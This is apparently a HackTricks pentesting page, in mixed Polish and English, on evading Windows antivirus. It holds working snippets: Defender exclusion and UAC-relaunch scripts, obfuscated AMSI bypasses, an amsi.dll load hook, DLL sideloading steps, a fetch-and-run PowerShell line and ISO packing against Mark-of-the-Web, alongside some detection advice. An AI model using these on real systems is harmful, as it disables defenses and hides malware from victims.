# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Wyłączanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender poprzez podszycie się pod inny AV.
- [Wyłącz Defender jeśli jesteś administratorem](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulacją Defenderem

Public loaders podszywające się pod game cheats często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień** i dopiero potem neutralizują Defendera. Przebieg jest prosty:

1. Sprawdza kontekst administracyjny za pomocą `net session`. Polecenie kończy się sukcesem tylko wtedy, gdy wywołujący ma prawa administratora, więc niepowodzenie wskazuje, że loader działa jako zwykły użytkownik.
2. Natychmiast ponownie uruchamia się z użyciem werbu `RunAs`, aby wywołać oczekiwane okno zgody UAC, jednocześnie zachowując oryginalną linię poleceń.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Ofiary już wierzą, że instalują „cracked” oprogramowanie, więc monit jest zwykle akceptowany, przyznając malware uprawnienia potrzebne do zmiany polityki Defendera.

### Ogólne wyłączenia `MpPreference` dla każdej litery dysku

Po uzyskaniu uprawnień, łańcuchy w stylu GachiLoader maksymalizują obszary niewidoczne dla Defendera zamiast całkowicie wyłączać usługę. Loader najpierw zabija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a następnie wprowadza **niezwykle szerokie wyłączenia**, dzięki czemu każdy profil użytkownika, katalog systemowy i dysk wymienny stają się nieskanowalne:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Kluczowe obserwacje:

- Pętla przegląda każdy zamontowany filesystem (D:\, E:\, USB sticks, itd.), więc **każdy przyszły payload upuszczony gdziekolwiek na dysku jest ignorowany**.
- Wyłączenie rozszerzenia `.sys` jest przyszłościowe—atakujący zyskują opcję załadowania unsigned driverów później bez ponownego dotykania Defendera.
- Wszystkie zmiany trafiają pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, co pozwala późniejszym etapom potwierdzić, że exclusions utrzymują się lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żaden service Defendera nie jest zatrzymywany, naiwne health checki wciąż raportują “antivirus active”, mimo że real-time inspection nigdy nie dotyka tych ścieżek.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wypisze listę programów podatnych na DLL hijacking w "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Gorąco polecam, abyś samodzielnie **explore DLL Hijackable/Sideloadable programs yourself**, ta technika jest dość dyskretna, jeśli zostanie poprawnie wykonana, ale jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz zostać łatwo złapany.

Sam fakt umieszczenia złośliwego DLL o nazwie, której program oczekuje załadować, nie spowoduje uruchomienia twojego payloadu, ponieważ program oczekuje konkretnych funkcji w tym DLL; aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania, które program wykonuje z proxy (i złośliwego) DLL do oryginalnego DLL, dzięki czemu funkcjonalność programu zostaje zachowana i można obsłużyć wykonanie twojego payloadu.

Będę używać projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalny, przemianowany DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany przy użyciu [SGN](https://github.com/EgeBalci/sgn)) jak i proxy DLL mają wykrywalność 0/26 na [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abusing Forwarded Exports (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które w rzeczywistości są "forwarderami": zamiast wskazywać na kod, wpis eksportu zawiera łańcuch ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiąże wpis eksportu, loader Windows wykona:

- Załaduje `TargetDll`, jeśli nie jest już załadowany
- Zlokalizuje `TargetFunc` w nim

Kluczowe zachowania do zrozumienia:
- Jeśli `TargetDll` jest KnownDLL, będzie dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, używany jest normalny porządek wyszukiwania DLL, który obejmuje katalog modułu wykonującego rozwiązywanie forwardu.

To umożliwia pośrednią sideloading primitive: znajdź podpisany DLL, który eksportuje funkcję przekierowaną do modułu o nazwie niebędącej KnownDLL, następnie umieść obok tego podpisanego DLL kontrolowany przez atakującego DLL o dokładnie takiej samej nazwie jak przekierowany docelowy moduł. Gdy przekierowany eksport zostanie wywołany, loader rozwiąże przekierowanie i załaduje twój DLL z tego samego katalogu, wykonując twój DllMain.

Przykład zaobserwowany na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany za pomocą normalnej kolejności wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisany systemowy DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny DllMain wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować funkcji forwardowanej, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wyzwól przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Loader następnie ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowany, otrzymasz błąd "missing API" dopiero po tym, jak `DllMain` już się wykonał

Hunting tips:
- Skoncentruj się na eksportach przekierowanych, gdzie docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć eksporty przekierowane za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitoruj LOLBins (np. `rundll32.exe`) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Wymuszaj polityki integralności kodu (WDAC/AppLocker) i zabroń zapisu+i wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i uruchomić swój shellcode w sposób ukryty.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to tylko gra w kotka i myszkę — to, co działa dziś, może zostać wykryte jutro. Nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć kilka technik omijania wykryć.

## AMSI (Anti-Malware Scan Interface)

AMSI zostało stworzone, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AV potrafiły skanować jedynie **pliki na dysku**, więc jeśli udało się w jakiś sposób wykonać payloady **bezpośrednio w pamięci**, AV nie miało wystarczającej widoczności, by je powstrzymać.

Funkcja AMSI jest zintegrowana z następującymi komponentami Windows:

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Pozwala to rozwiązaniom antywirusowym na analizę zachowania skryptów, udostępniając ich treść w formie niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zauważ, że poprzedza je `amsi:`, a potem ścieżka do wykonywalnego pliku, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci w pamięci z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również przechodzi przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])` używanego do ładowania i wykonywania w pamięci. Dlatego rekomenduje się używanie starszych wersji .NET (np. 4.7.2 lub niższych) dla wykonania w pamięci, jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI w dużej mierze opiera się na wykryciach statycznych, modyfikacja skryptów, które próbujesz załadować, może być dobrym sposobem na ominięcie detekcji.

- Jednak AMSI potrafi deobfuskować skrypty nawet jeśli są wielowarstwowo ukryte, więc obfuskacja może być złym wyborem w zależności od sposobu jej przeprowadzenia. To sprawia, że omijanie nie jest trywialne. Czasami jednak wystarczy zmienić kilka nazw zmiennych i to wystarczy — zależy to od tego, jak bardzo coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), możliwe jest manipulowanie nim nawet przy uruchomieniu jako nieuprzywilejowany użytkownik. Z powodu tej luki implementacyjnej badacze znaleźli wiele sposobów na ominięcie skanowania przez AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie uruchomione żadne skanowanie. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby ograniczyć szersze użycie.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc konieczna jest pewna modyfikacja, aby móc użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blokowanie AMSI poprzez zapobieganie załadowaniu amsi.dll (LdrLoadDll hook)

AMSI jest inicjalizowany dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidnym, niezależnym od języka obejściem jest umieszczenie hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W efekcie AMSI nigdy się nie załaduje i dla tego procesu nie są wykonywane żadne skany.

Zarys implementacji (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa w PowerShell, WScript/CScript oraz w custom loaderach (wszystko, co normalnie załadowałoby AMSI).
- Używaj razem z podawaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Zaobserwowano użycie w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą AMSI sygnaturę z pamięci bieżącego procesu. Narzędzie działa poprzez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, efektywnie usuwając ją z pamięci.

**AV/EDR products that uses AMSI**

Listę produktów AV/EDR wykorzystujących AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj Powershell wersji 2**
Jeśli użyjesz Powershell wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonywane na systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też być **problemem dla atakujących, którzy chcą unikać wykrycia**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) do tego celu.
- **Use Powershell version 2**: Jeśli użyjesz PowerShell version 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby stworzyć powershell bez zabezpieczeń (to jest to, czego używa `powerpick` z Cobal Strike).


## Obfuscation

> [!TIP]
> Kilka technik obfuskacji opiera się na szyfrowaniu danych, co zwiększa entropię binarki i ułatwia jej wykrycie przez AV i EDR. Uważaj na to i rozważ stosowanie szyfrowania tylko dla konkretnych sekcji kodu, które są wrażliwe lub muszą być ukryte.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Podczas analizy malware wykorzystującego ConfuserEx 2 (lub jego komercyjne forki) często napotykasz kilka warstw ochrony, które blokują dekompilery i sandboksy. Poniższy proces niezawodnie **przywraca niemal oryginalny IL**, który można następnie zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Anti-tampering removal – ConfuserEx szyfruje każde *method body* i odszyfrowuje je wewnątrz statycznego konstruktora modułu (`<Module>.cctor`). To także modyfikuje sumę kontrolną PE, więc każda zmiana spowoduje awarię binarki. Użyj **AntiTamperKiller** aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i przepisać czysty assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Wyjście zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy tworzeniu własnego unpackera.

2.  Symbol / control-flow recovery – podaj *clean* plik do **de4dot-cex** (fork de4dot obsługujący ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wybierz profil ConfuserEx 2  
• de4dot cofa spłaszczenie przepływu sterowania (control-flow flattening), przywraca oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfrowuje stałe łańcuchy.

3.  Proxy-call stripping – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (a.k.a *proxy calls*), aby dalej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne API .NET, takie jak `Convert.FromBase64String` czy `AES.Create()` zamiast nieprzejrzystych funkcji wrapperów (`Class8.smethod_10`, …).

4.  Manual clean-up – uruchom powstały binarny w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Często malware przechowuje go jako tablicę bajtów zakodowaną TLV inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy ciąg przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwej próbki – przydatne przy pracy na stacji offline.

> 🛈  ConfuserEx tworzy niestandardowy atrybut o nazwie `ConfusedByAttribute`, który może być użyty jako IOC do automatycznego triage próbek.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/) umożliwiającego zwiększenie bezpieczeństwa oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć `C++11/14` języka do wygenerowania, w czasie kompilacji, obfuscated code bez użycia jakiegokolwiek zewnętrznego narzędzia i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowaną przez C++ template metaprogramming framework, co utrudni żywot osobie chcącej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator zdolny do obfuskacji różnych plików PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to fine-grained code obfuscation framework dla języków wspieranych przez LLVM wykorzystujący ROP (return-oriented programming). ROPfuscator obfuscates program na poziomie assembly code przez przekształcanie zwykłych instrukcji w ROP chains, podważając nasze naturalne pojmowanie normalnego control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL na shellcode, a następnie je załadować

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający na celu ochronę końcowego użytkownika przed uruchomieniem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o podejście oparte na reputacji, co oznacza, że rzadko pobierane aplikacje wyzwolą SmartScreen, ostrzegając i uniemożliwiając końcowemu użytkownikowi wykonanie pliku (chociaż plik wciąż można uruchomić klikając Więcej informacji -> Uruchom mimo to).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest tworzony automatycznie podczas pobierania plików z internetu, wraz z URL, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Ważne: pliki wykonywalne podpisane z zaufanym certyfikatem podpisywania nie spowodują aktywacji SmartScreen.

Bardzo skutecznym sposobem, aby zapobiec otrzymaniu przez twoje payloads Mark of The Web, jest spakowanie ich w jakiś kontener, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być zastosowany do **non NTFS** wolumenów.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloads do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykład użycia:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

